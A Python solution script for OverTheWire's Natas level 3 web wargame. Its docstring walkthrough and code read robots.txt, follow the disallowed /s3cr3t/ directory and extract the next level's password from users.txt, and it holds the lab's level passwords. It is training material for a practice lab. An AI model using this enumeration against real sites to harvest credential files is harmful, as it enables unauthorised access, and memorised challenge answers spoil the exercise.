#!/usr/bin/env python3
'''
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas3.py
https://www.youtube.com/watch?v=_u9Zb1TsUks&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=2  4:05
https://docs.python-requests.org/en/master/
http://www.robotstxt.org/robotstxt.html

Level 3 → Level 4
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14  
problem: There is nothing on this page 

1.  check the Source Code
   output:
    commented hint. It says “Not even Google will find it this time”. 
 
    Search Engine spiders always leave the links that are disallowed the robots.txt file.
   So, we thought to check if this website has one.

2. Open 'robots.txt' file
http://natas3.natas.labs.overthewire.org/robots.txt
  output:
         User-agent: *
         Disallow: /s3cr3t/
3. open 's3cr3t'  
      http://natas3.natas.labs.overthewire.org/s3cr3t/
   output:
      users.txt	2016-12-20 05:15 	40 	 

4.  open ' users.txt' 
       http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
    output:
   natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ  
 
'''
import requests
import re

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
  
url = 'http://%s.natas.labs.overthewire.org/' % username
url_robots = url+'/robots.txt' 

print(url)
reponse = requests.get(url, auth = (username, password))
content = reponse.text
print(content)
print(url_robots)
reponse = requests.get(url_robots, auth = (username, password))
content = reponse.text

 
 
print ('\n\nContent of  [ robots.txt file ]  \n\n', content)

reply = re.findall('Disallow: /(.*)', content)[0]
print (reply)

url_sec =  url+ reply+'users.txt'  
print(url_sec)  

reponse = requests.get(url_sec, auth = (username, password))
content = reponse.text
print(content)
reply = re.findall('natas4:(.*)', content)[0]
print (reply)